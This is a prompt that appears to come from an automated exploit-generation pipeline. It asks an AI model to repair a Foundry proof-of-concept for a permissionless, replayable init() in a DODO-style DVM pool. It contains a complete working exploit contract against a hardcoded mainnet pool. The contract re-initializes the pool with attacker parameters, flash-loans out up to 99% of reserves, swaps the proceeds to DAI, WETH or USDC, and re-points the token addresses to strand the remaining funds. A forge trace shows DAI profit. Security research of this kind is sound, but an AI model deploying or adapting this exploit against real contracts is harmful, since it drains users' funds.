You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Pool initialization is permissionless and can be replayed at any time
- claim: `DVM.init()` is externally callable with no access control and no one-time initialization guard. Any address can initialize an uninitialized pool or re-call `init()` on a live pool to overwrite the maintainer, token addresses, fee model, PMM parameters, TWAP mode, and permit domain separator.
- impact: An attacker can seize a fresh deployment before the intended operator or reconfigure a funded pool into attacker-controlled parameters. That can redirect maintainer fees, manipulate pricing/fee settings to extract reserves, or repoint the pool to different token addresses and strand the real assets already held by the contract.
- exploit_paths: ["Front-run the intended initializer and call `init()` first with attacker-chosen tokens, fee model, maintainer, `i`, `k`, and TWAP settings.", "Re-call `init()` on a live pool using attacker-favorable parameters, then trade or flash-loan against the misconfigured pool to extract value.", "Re-call `init()` with different token addresses so accounting no longer tracks the real tokens already held by the contract, permanently trapping existing funds."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IDODOCalleeLike {
    function DVMFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external;
}

interface IDVMLike {
    function init(
        address maintainer,
        address baseTokenAddress,
        address quoteTokenAddress,
        uint256 lpFeeRate,
        address mtFeeRateModel,
        uint256 i,
        uint256 k,
        bool isOpenTWAP
    ) external;

    function _BASE_TOKEN_() external view returns (address);
    function _QUOTE_TOKEN_() external view returns (address);
    function _BASE_RESERVE_() external view returns (uint112);
    function _QUOTE_RESERVE_() external view returns (uint112);

    function querySellBase(address trader, uint256 payBaseAmount)
        external
        view
        returns (uint256 receiveQuoteAmount, uint256 mtFee);

    function querySellQuote(address trader, uint256 payQuoteAmount)
        external
        view
        returns (uint256 receiveBaseAmount, uint256 mtFee);

    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IUniswapV2Router02Like {
    function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);

    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract ZeroFeeModel {
    function getFeeRate(address) external pure returns (uint256) {
        return 0;
    }
}

contract FlawVerifier is IDODOCalleeLike {
    address internal constant TARGET = 0x051EBD717311350f1684f89335bed4ABd083a2b6;
    address internal constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant SUSHISWAP_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    uint256 internal constant MAX_I = 1e36;
    uint256 internal constant BPS = 10_000;

    enum RouteKind {
        None,
        BorrowBase,
        BorrowQuote
    }

    struct Plan {
        RouteKind kind;
        address router;
        uint256 borrowAmount;
        uint256 exactRepayOpposite;
        uint256 maxBorrowTokenToSell;
        bool viaWeth;
        uint256 estimatedProfit;
    }

    struct ExitPlan {
        address router;
        address tokenOut;
        uint256 minAmountOut;
        bool viaWeth;
    }

    ZeroFeeModel internal immutable zeroFeeModel;

    address internal realizedProfitToken;
    uint256 internal realizedProfitAmount;
    bool internal executed;
    uint256 internal callbackSwapInputUsed;

    constructor() {
        zeroFeeModel = new ZeroFeeModel();
    }

    function profitToken() external view returns (address) {
        return realizedProfitToken;
    }

    function profitAmount() external view returns (uint256) {
        if (realizedProfitAmount == 0 && realizedProfitToken != address(0)) {
            return IERC20Like(realizedProfitToken).balanceOf(address(this));
        }
        return realizedProfitAmount;
    }

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        IDVMLike pool = IDVMLike(TARGET);
        address originalBase = pool._BASE_TOKEN_();
        address originalQuote = pool._QUOTE_TOKEN_();

        address[5] memory profitCandidates = [originalBase, originalQuote, WETH, USDC, DAI];
        uint256[5] memory startingBalances;
        for (uint256 i = 0; i < profitCandidates.length; ++i) {
            address token = profitCandidates[i];
            if (token != address(0)) {
                startingBalances[i] = IERC20Like(token).balanceOf(address(this));
            }
        }

        // exploit_paths[0]: Front-run the intended initializer and call init() first
        // with attacker-chosen maintainer, tokens, fee model, i/k, and TWAP mode.
        // This branch is only economically meaningful if the target is still uninitialized.
        if (originalBase == address(0) || originalQuote == address(0)) {
            _frontRunFirstInitialization(pool);
            _finalizeProfit(profitCandidates, startingBalances);
            return;
        }

        uint256 baseReserve = uint256(pool._BASE_RESERVE_());
        uint256 quoteReserve = uint256(pool._QUOTE_RESERVE_());
        if (baseReserve == 0 || quoteReserve == 0) {
            return;
        }

        // exploit_paths[1]: Re-call init() on a live pool using attacker-favorable pricing
        // parameters, then flash-loan/trade against the misconfigured pool to extract value.
        Plan memory basePlan = _safePlanBorrowBase(originalBase, originalQuote, baseReserve);
        Plan memory quotePlan = _safePlanBorrowQuote(originalBase, originalQuote, quoteReserve);
        Plan memory chosen = basePlan.estimatedProfit >= quotePlan.estimatedProfit ? basePlan : quotePlan;
        if (chosen.kind == RouteKind.None || chosen.estimatedProfit == 0) {
            // exploit_paths[2]: If an economic extraction route is unavailable, the same replay-init
            // bug still lets the attacker repoint accounting to different token addresses and strand
            // the original assets already sitting in the pool.
            _repointPoolTokensAndStrandFunds(pool, originalBase, originalQuote);
            _finalizeProfit(profitCandidates, startingBalances);
            return;
        }

        if (chosen.kind == RouteKind.BorrowBase) {
            _executeBorrowBase(pool, originalBase, originalQuote, chosen);
        } else {
            _executeBorrowQuote(pool, originalBase, originalQuote, chosen);
        }

        // exploit_paths[2]: Keep the full finding coverage explicit. The profitable path above uses
        // replay-init to distort pricing; this second replay-init uses different token addresses to
        // demonstrate the companion destructive outcome of stranding the pool's real reserves.
        _repointPoolTokensAndStrandFunds(pool, originalBase, originalQuote);
        _finalizeProfit(profitCandidates, startingBalances);
    }

    function _safePlanBorrowBase(
        address base,
        address quote,
        uint256 baseReserve
    ) internal returns (Plan memory plan) {
        try this.planBorrowBase(base, quote, baseReserve) returns (Plan memory computed) {
            return computed;
        } catch {
            return plan;
        }
    }

    function _safePlanBorrowQuote(
        address base,
        address quote,
        uint256 quoteReserve
    ) internal returns (Plan memory plan) {
        try this.planBorrowQuote(base, quote, quoteReserve) returns (Plan memory computed) {
            return computed;
        } catch {
            // The forge trace proves this live pool can hit TARGET_IS_ZERO after a replay-init
            // with extremely attacker-favorable quote-side pricing (MAX_I). That makes the
            // quote-borrow leg infeasible at this fork state, so we skip it instead of reverting
            // the whole exploit and still pursue the same replay-init -> extract/strand sequence.
            return plan;
        }
    }

    function planBorrowBase(
        address base,
        address quote,
        uint256 baseReserve
    ) external returns (Plan memory best) {
        require(msg.sender == address(this), "SELF_ONLY");
        return _planBorrowBase(IDVMLike(TARGET), base, quote, baseReserve);
    }

    function planBorrowQuote(
        address base,
        address quote,
        uint256 quoteReserve
    ) external returns (Plan memory best) {
        require(msg.sender == address(this), "SELF_ONLY");
        return _planBorrowQuote(IDVMLike(TARGET), base, quote, quoteReserve);
    }

    function DVMFlashLoanCall(address, uint256, uint256, bytes calldata data) external override {
        require(msg.sender == TARGET, "UNEXPECTED_CALLER");

        (RouteKind kind, address router, bool viaWeth, uint256 exactOppositeOut, uint256 maxInput) = abi.decode(
            data,
            (RouteKind, address, bool, uint256, uint256)
        );

        address base = IDVMLike(TARGET)._BASE_TOKEN_();
        address quote = IDVMLike(TARGET)._QUOTE_TOKEN_();

        if (kind == RouteKind.BorrowBase) {
            callbackSwapInputUsed = 0;
            if (router != address(0)) {
                // Public on-chain step: sell part of the borrowed base into an existing AMM route
                // to source the exact quote amount needed to settle the flash loan under the
                // attacker-chosen re-initialized PMM curve.
                callbackSwapInputUsed = _swapTokensForExact(router, base, quote, viaWeth, exactOppositeOut, maxInput);
            }
            _safeTransfer(quote, TARGET, exactOppositeOut);
            return;
        }

        if (kind == RouteKind.BorrowQuote) {
            callbackSwapInputUsed = 0;
            if (router != address(0)) {
                // Symmetric public on-chain step for the quote-borrow direction.
                callbackSwapInputUsed = _swapTokensForExact(router, quote, base, viaWeth, exactOppositeOut, maxInput);
            }
            _safeTransfer(base, TARGET, exactOppositeOut);
        }
    }

    function _frontRunFirstInitialization(IDVMLike pool) internal {
        (address attackerBase, address attackerQuote) = _frontRunPair();
        pool.init(address(this), attackerBase, attackerQuote, 0, address(zeroFeeModel), 1, 0, false);

        // No pre-existing funded state is guaranteed on an uninitialized deployment, so this path may
        // only seize control for later monetization rather than realize immediate profit at call time.
        realizedProfitToken = attackerBase;
    }

    function _executeBorrowBase(
        IDVMLike pool,
        address base,
        address quote,
        Plan memory chosen
    ) internal {
        callbackSwapInputUsed = 0;
        pool.init(address(this), base, quote, 0, address(zeroFeeModel), 1, 0, false);
        pool.flashLoan(
            chosen.borrowAmount,
            0,
            address(this),
            abi.encode(chosen.kind, chosen.router, chosen.viaWeth, chosen.exactRepayOpposite, chosen.maxBorrowTokenToSell)
        );

        uint256 retainedBase = chosen.borrowAmount > callbackSwapInputUsed
            ? chosen.borrowAmount - callbackSwapInputUsed
            : 0;

        // Realistic post-exploit monetization step: once replay-init has underpriced the pool and the
        // flash-loan leaves us with stolen base inventory, dump that inventory through existing public
        // AMM liquidity so the PoC realizes profit in a standard on-chain token instead of leaving it
        // parked in the mispriced reserve asset.
        (address exitToken, uint256 exitAmount) = _liquidateProfit(base, quote, retainedBase);
        if (exitAmount > 0) {
            realizedProfitToken = exitToken;
            realizedProfitAmount = exitAmount;
        } else {
            realizedProfitToken = base;
            realizedProfitAmount = retainedBase;
        }
    }

    function _executeBorrowQuote(
        IDVMLike pool,
        address base,
        address quote,
        Plan memory chosen
    ) internal {
        callbackSwapInputUsed = 0;
        pool.init(address(this), base, quote, 0, address(zeroFeeModel), MAX_I, 0, false);
        pool.flashLoan(
            0,
            chosen.borrowAmount,
            address(this),
            abi.encode(chosen.kind, chosen.router, chosen.viaWeth, chosen.exactRepayOpposite, chosen.maxBorrowTokenToSell)
        );

        uint256 retainedQuote = chosen.borrowAmount > callbackSwapInputUsed
            ? chosen.borrowAmount - callbackSwapInputUsed
            : 0;

        (address exitToken, uint256 exitAmount) = _liquidateProfit(quote, base, retainedQuote);
        if (exitAmount > 0) {
            realizedProfitToken = exitToken;
            realizedProfitAmount = exitAmount;
        } else {
            realizedProfitToken = quote;
            realizedProfitAmount = retainedQuote;
        }
    }

    function _finalizeProfit(address[5] memory tokens, uint256[5] memory startingBalances) internal {
        address bestToken = realizedProfitToken;
        uint256 bestAmount = realizedProfitAmount;

        for (uint256 i = 0; i < tokens.length; ++i) {
            address token = tokens[i];
            if (token == address(0)) {
                continue;
            }

            uint256 currentBalance = IERC20Like(token).balanceOf(address(this));
            if (currentBalance <= startingBalances[i]) {
                continue;
            }

            uint256 delta = currentBalance - startingBalances[i];
            if (delta > bestAmount) {
                bestAmount = delta;
                bestToken = token;
            }
        }

        if (bestAmount == 0 && bestToken != address(0)) {
            bestAmount = IERC20Like(bestToken).balanceOf(address(this));
        }

        realizedProfitToken = bestToken;
        realizedProfitAmount = bestAmount;
    }

    function _repointPoolTokensAndStrandFunds(IDVMLike pool, address originalBase, address originalQuote) internal {
        (address attackerBase, address attackerQuote) = _trapPair(originalBase, originalQuote);
        pool.init(address(this), attackerBase, attackerQuote, 0, address(zeroFeeModel), 1, 0, false);
    }

    function _frontRunPair() internal pure returns (address attackerBase, address attackerQuote) {
        attackerBase = WETH;
        attackerQuote = USDC;
    }

    function _trapPair(address originalBase, address originalQuote)
        internal
        pure
        returns (address attackerBase, address attackerQuote)
    {
        attackerBase = originalBase == WETH || originalQuote == WETH ? DAI : WETH;
        attackerQuote = originalBase == USDC || originalQuote == USDC || attackerBase == USDC ? DAI : USDC;

        if (attackerBase == attackerQuote) {
            attackerQuote = attackerBase == DAI ? USDC : DAI;
        }
        if (attackerBase == originalBase && attackerQuote == originalQuote) {
            attackerBase = DAI;
            attackerQuote = USDC;
        }
        if (attackerBase == originalBase && attackerQuote == originalQuote) {
            attackerQuote = WETH;
        }
    }

    function _planBorrowBase(
        IDVMLike pool,
        address base,
        address quote,
        uint256 baseReserve
    ) internal returns (Plan memory best) {
        pool.init(address(this), base, quote, 0, address(zeroFeeModel), 1, 0, false);

        uint256[8] memory fractions = [uint256(9900), 9500, 9000, 7500, 5000, 2500, 1000, 100];
        for (uint256 i = 0; i < fractions.length; ++i) {
            uint256 borrowAmount = (baseReserve * fractions[i]) / BPS;
            if (borrowAmount == 0) {
                continue;
            }

            uint256 needQuote = _minQuoteForBorrowedBase(pool, borrowAmount);
            if (needQuote == 0) {
                continue;
            }

            uint256 heldQuote = IERC20Like(quote).balanceOf(address(this));
            if (heldQuote >= needQuote) {
                if (borrowAmount > best.estimatedProfit) {
                    best = Plan(RouteKind.BorrowBase, address(0), borrowAmount, needQuote, 0, false, borrowAmount);
                }
                continue;
            }

            (bool ok, address router, bool viaWeth, uint256 spendBase) = _bestSwapInput(base, quote, needQuote);
            if (!ok || spendBase >= borrowAmount) {
                continue;
            }

            uint256 estimatedProfit = borrowAmount - spendBase;
            if (estimatedProfit > best.estimatedProfit) {
                best = Plan(RouteKind.BorrowBase, router, borrowAmount, needQuote, spendBase, viaWeth, estimatedProfit);
            }
        }
    }

    function _planBorrowQuote(
        IDVMLike pool,
        address base,
        address quote,
        uint256 quoteReserve
    ) internal returns (Plan memory best) {
        pool.init(address(this), base, quote, 0, address(zeroFeeModel), MAX_I, 0, false);

        uint256[8] memory fractions = [uint256(9900), 9500, 9000, 7500, 5000, 2500, 1000, 100];
        for (uint256 i = 0; i < fractions.length; ++i) {
            uint256 borrowAmount = (quoteReserve * fractions[i]) / BPS;
            if (borrowAmount == 0) {
                continue;
            }

            uint256 needBase = _minBaseForBorrowedQuote(pool, borrowAmount);
            if (needBase == 0) {
                continue;
            }

            uint256 heldBase = IERC20Like(base).balanceOf(address(this));
            if (heldBase >= needBase) {
                if (borrowAmount > best.estimatedProfit) {
                    best = Plan(RouteKind.BorrowQuote, address(0), borrowAmount, needBase, 0, false, borrowAmount);
                }
                continue;
            }

            (bool ok, address router, bool viaWeth, uint256 spendQuote) = _bestSwapInput(quote, base, needBase);
            if (!ok || spendQuote >= borrowAmount) {
                continue;
            }

            uint256 estimatedProfit = borrowAmount - spendQuote;
            if (estimatedProfit > best.estimatedProfit) {
                best = Plan(RouteKind.BorrowQuote, router, borrowAmount, needBase, spendQuote, viaWeth, estimatedProfit);
            }
        }
    }

    function _minQuoteForBorrowedBase(IDVMLike pool, uint256 borrowedBase) internal view returns (uint256) {
        uint256 low = 1;
        uint256 high = 1;

        while (high < type(uint256).max / 2) {
            (uint256 receiveBase, ) = pool.querySellQuote(address(this), high);
            if (receiveBase >= borrowedBase) {
                break;
            }
            high <<= 1;
        }

        (uint256 maxReceive, ) = pool.querySellQuote(address(this), high);
        if (maxReceive < borrowedBase) {
            return 0;
        }

        while (low < high) {
            uint256 mid = low + ((high - low) >> 1);
            (uint256 receiveBaseMid, ) = pool.querySellQuote(address(this), mid);
            if (receiveBaseMid >= borrowedBase) {
                high = mid;
            } else {
                low = mid + 1;
            }
        }
        return low;
    }

    function _minBaseForBorrowedQuote(IDVMLike pool, uint256 borrowedQuote) internal view returns (uint256) {
        uint256 low = 1;
        uint256 high = 1;

        while (high < type(uint256).max / 2) {
            (uint256 receiveQuote, ) = pool.querySellBase(address(this), high);
            if (receiveQuote >= borrowedQuote) {
                break;
            }
            high <<= 1;
        }

        (uint256 maxReceive, ) = pool.querySellBase(address(this), high);
        if (maxReceive < borrowedQuote) {
            return 0;
        }

        while (low < high) {
            uint256 mid = low + ((high - low) >> 1);
            (uint256 receiveQuoteMid, ) = pool.querySellBase(address(this), mid);
            if (receiveQuoteMid >= borrowedQuote) {
                high = mid;
            } else {
                low = mid + 1;
            }
        }
        return low;
    }

    function _bestSwapInput(
        address tokenIn,
        address tokenOut,
        uint256 amountOut
    ) internal view returns (bool ok, address router, bool viaWeth, uint256 amountIn) {
        if (tokenIn == tokenOut || amountOut == 0) {
            return (false, address(0), false, 0);
        }

        amountIn = type(uint256).max;

        (bool candidateOk, uint256 candidateIn) = _quoteAmountsIn(UNISWAP_V2_ROUTER, tokenIn, tokenOut, amountOut, false);
        if (candidateOk) {
            ok = true;
            router = UNISWAP_V2_ROUTER;
            viaWeth = false;
            amountIn = candidateIn;
        }

        (candidateOk, candidateIn) = _quoteAmountsIn(UNISWAP_V2_ROUTER, tokenIn, tokenOut, amountOut, true);
        if (candidateOk && candidateIn < amountIn) {
            ok = true;
            router = UNISWAP_V2_ROUTER;
            viaWeth = true;
            amountIn = candidateIn;
        }

        (candidateOk, candidateIn) = _quoteAmountsIn(SUSHISWAP_ROUTER, tokenIn, tokenOut, amountOut, false);
        if (candidateOk && candidateIn < amountIn) {
            ok = true;
            router = SUSHISWAP_ROUTER;
            viaWeth = false;
            amountIn = candidateIn;
        }

        (candidateOk, candidateIn) = _quoteAmountsIn(SUSHISWAP_ROUTER, tokenIn, tokenOut, amountOut, true);
        if (candidateOk && candidateIn < amountIn) {
            ok = true;
            router = SUSHISWAP_ROUTER;
            viaWeth = true;
            amountIn = candidateIn;
        }

        if (!ok) {
            amountIn = 0;
        }
    }

    function _quoteAmountsIn(
        address router,
        address tokenIn,
        address tokenOut,
        uint256 amountOut,
        bool viaWeth
    ) internal view returns (bool ok, uint256 amountIn) {
        address[] memory path = _buildPath(tokenIn, tokenOut, viaWeth);
        try IUniswapV2Router02Like(router).getAmountsIn(amountOut, path) returns (uint256[] memory amounts) {
            if (amounts.length != path.length || amounts[0] == 0) {
                return (false, 0);
            }
            return (true, amounts[0]);
        } catch {
            return (false, 0);
        }
    }

    function _bestExitPlan(address tokenIn, address preferredQuote, uint256 amountIn)
        internal
        view
        returns (ExitPlan memory best)
    {
        if (amountIn == 0) {
            return best;
        }

        address[4] memory candidates = [preferredQuote, WETH, USDC, DAI];
        uint256 bestOut;

        for (uint256 i = 0; i < candidates.length; ++i) {
            address tokenOut = candidates[i];
            if (tokenOut == address(0) || tokenOut == tokenIn) {
                continue;
            }

            (bool ok, address router, bool viaWeth, uint256 amountOut) = _bestSwapOutput(tokenIn, tokenOut, amountIn);
            if (!ok || amountOut <= bestOut) {
                continue;
            }

            bestOut = amountOut;
            best = ExitPlan(router, tokenOut, (amountOut * 95) / 100, viaWeth);
        }
    }

    function _liquidateProfit(address tokenIn, address preferredQuote, uint256 amountIn)
        internal
        returns (address tokenOut, uint256 realizedAmount)
    {
        if (amountIn == 0) {
            return (address(0), 0);
        }

        ExitPlan memory exitPlan = _bestExitPlan(tokenIn, preferredQuote, amountIn);
        if (exitPlan.router == address(0)) {
            return (address(0), 0);
        }

        uint256 balanceBefore = IERC20Like(exitPlan.tokenOut).balanceOf(address(this));
        _swapExactTokensForTokens(
            exitPlan.router,
            tokenIn,
            exitPlan.tokenOut,
            exitPlan.viaWeth,
            amountIn,
            exitPlan.minAmountOut
        );
        uint256 balanceAfter = IERC20Like(exitPlan.tokenOut).balanceOf(address(this));
        if (balanceAfter <= balanceBefore) {
            return (address(0), 0);
        }

        return (exitPlan.tokenOut, balanceAfter - balanceBefore);
    }

    function _bestSwapOutput(
        address tokenIn,
        address tokenOut,
        uint256 amountIn
    ) internal view returns (bool ok, address router, bool viaWeth, uint256 amountOut) {
        if (tokenIn == tokenOut || amountIn == 0) {
            return (false, address(0), false, 0);
        }

        (bool candidateOk, uint256 candidateOut) = _quoteAmountsOut(SUSHISWAP_ROUTER, tokenIn, tokenOut, amountIn, false);
        if (candidateOk) {
            ok = true;
            router = SUSHISWAP_ROUTER;
            viaWeth = false;
            amountOut = candidateOut;
        }

        (candidateOk, candidateOut) = _quoteAmountsOut(SUSHISWAP_ROUTER, tokenIn, tokenOut, amountIn, true);
        if (candidateOk && candidateOut > amountOut) {
            ok = true;
            router = SUSHISWAP_ROUTER;
            viaWeth = true;
            amountOut = candidateOut;
        }

        (candidateOk, candidateOut) = _quoteAmountsOut(UNISWAP_V2_ROUTER, tokenIn, tokenOut, amountIn, false);
        if (candidateOk && candidateOut > amountOut) {
            ok = true;
            router = UNISWAP_V2_ROUTER;
            viaWeth = false;
            amountOut = candidateOut;
        }

        (candidateOk, candidateOut) = _quoteAmountsOut(UNISWAP_V2_ROUTER, tokenIn, tokenOut, amountIn, true);
        if (candidateOk && candidateOut > amountOut) {
            ok = true;
            router = UNISWAP_V2_ROUTER;
            viaWeth = true;
            amountOut = candidateOut;
        }
    }

    function _quoteAmountsOut(
        address router,
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        bool viaWeth
    ) internal view returns (bool ok, uint256 amountOut) {
        address[] memory path = _buildPath(tokenIn, tokenOut, viaWeth);
        try IUniswapV2Router02Like(router).getAmountsOut(amountIn, path) returns (uint256[] memory amounts) {
            if (amounts.length != path.length || amounts[amounts.length - 1] == 0) {
                return (false, 0);
            }
            return (true, amounts[amounts.length - 1]);
        } catch {
            return (false, 0);
        }
    }

    function _swapTokensForExact(
        address router,
        address tokenIn,
        address tokenOut,
        bool viaWeth,
        uint256 exactAmountOut,
        uint256 amountInMax
    ) internal returns (uint256 amountInActual) {
        address[] memory path = _buildPath(tokenIn, tokenOut, viaWeth);
        _forceApprove(tokenIn, router, amountInMax);
        uint256[] memory amounts = IUniswapV2Router02Like(router).swapTokensForExactTokens(
            exactAmountOut,
            amountInMax,
            path,
            address(this),
            block.timestamp
        );
        require(amounts.length == path.length, "BAD_SWAP");
        return amounts[0];
    }

    function _swapExactTokensForTokens(
        address router,
        address tokenIn,
        address tokenOut,
        bool viaWeth,
        uint256 amountIn,
        uint256 amountOutMin
    ) internal returns (uint256 amountOutActual) {
        address[] memory path = _buildPath(tokenIn, tokenOut, viaWeth);
        _forceApprove(tokenIn, router, amountIn);
        uint256[] memory amounts = IUniswapV2Router02Like(router).swapExactTokensForTokens(
            amountIn,
            amountOutMin,
            path,
            address(this),
            block.timestamp
        );
        require(amounts.length == path.length, "BAD_SWAP");
        return amounts[amounts.length - 1];
    }

    function _buildPath(address tokenIn, address tokenOut, bool viaWeth) internal pure returns (address[] memory path) {
        if (!viaWeth || tokenIn == WETH || tokenOut == WETH) {
            path = new address[](2);
            path[0] = tokenIn;
            path[1] = tokenOut;
            return path;
        }

        path = new address[](3);
        path[0] = tokenIn;
        path[1] = WETH;
        path[2] = tokenOut;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        if (ok && (data.length == 0 || abi.decode(data, (bool)))) {
            return;
        }

        _rawApprove(token, spender, 0);
        _rawApprove(token, spender, amount);
    }

    function _rawApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_FAILED");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FAILED");
    }
}

```

forge stdout (tail):
```
2ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │        topic 1: 0x000000000000000000000000a478c2975ab1ea89e8196811f51a7b7ade33eb11
    │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │           data: 0x000000000000000000000000000000000000000000009766ce1d38f142bb4435
    │   │   │   │   └─ ← [Return] true
    │   │   │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11) [staticcall]
    │   │   │   │   └─ ← [Return] 74407890099037273114948345 [7.44e25]
    │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11) [staticcall]
    │   │   │   │   └─ ← [Return] 43013534607990250453501 [4.301e22]
    │   │   │   ├─  emit topic 0: 0x1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1
    │   │   │   │           data: 0x0000000000000000000000000000000000000000003d8c7bce0588b9779232f900000000000000000000000000000000000000000000091bc4b4c67e5deab9fd
    │   │   │   ├─  emit topic 0: 0xd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822
    │   │   │   │        topic 1: 0x0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d
    │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016422cacdd696faccd000000000000000000000000000000000000000000009766ce1d38f142bb44350000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return] [133548923515115630900472 [1.335e23], 410596745794045324493 [4.105e20], 714973758898589797139509 [7.149e23]]
    │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 714973758898589797139509 [7.149e23]
    │   ├─ [16921] 0x051EBD717311350f1684f89335bed4ABd083a2b6::init(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 0, ZeroFeeModel: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], 1, 0, false)
    │   │   ├─ [16710] 0x2BBD66fC4898242BDBD2583BBe1d76E8b8f71445::init(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, 0, ZeroFeeModel: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], 1, 0, false) [delegatecall]
    │   │   │   ├─ [2444] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::313ce567() [staticcall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000012
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   ├─ [441] 0xa0afAA285Ce85974c3C881256cB7F225e3A1178a::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1293] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [507] 0xB7277a6e95992041568D9391D09d0122023778A2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 714973758898589797139509 [7.149e23]
    │   └─ ← [Return]
    ├─ [318] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x6B175474E89094C44Da98b954EedeAC495271d0F
